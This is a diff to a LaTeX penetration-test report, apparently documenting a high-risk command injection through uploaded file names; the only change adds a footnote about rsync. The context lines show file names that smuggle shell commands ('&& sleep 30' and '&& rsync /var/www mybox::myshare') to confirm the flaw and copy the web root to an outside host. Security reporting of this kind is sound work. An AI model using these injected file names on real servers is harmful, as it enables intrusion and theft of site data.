@@ -245,7 +245,7 @@ Risk: high\newline
 
 \subsection{Discovery}
 
-The discovery was easily found by simply uploading a file called \textit{\&\& sleep 30}. We then noticed that the response of the server is delayed by about 30 seconds. This was reason enough to try some more. We then tried to execute code which will download the \textit{/var/www} directory to our local box. The main problem was that it is not possible to use slashes in Unix file names. That means we can not easily change directories or name the file something like this:
+The discovery was easily found by simply uploading a file called \textit{\&\& sleep 30}. We then noticed that the response of the server is delayed by about 30 seconds. This was reason enough to try some more. We then tried to execute code which will download the \textit{/var/www} directory to our local box. The main problem was that it is not possible to use slashes in Unix file names. That means we can not easily change directories or name the file something like this\footnote{For more information on rsync and the rsync daemon please have a look at Appendix \ref{appendix:rsync}}:
 
 \begin{lstlisting}[caption=File with '/' (does not work), label=listing:not_working_file]
 && rsync /var/www mybox::myshare
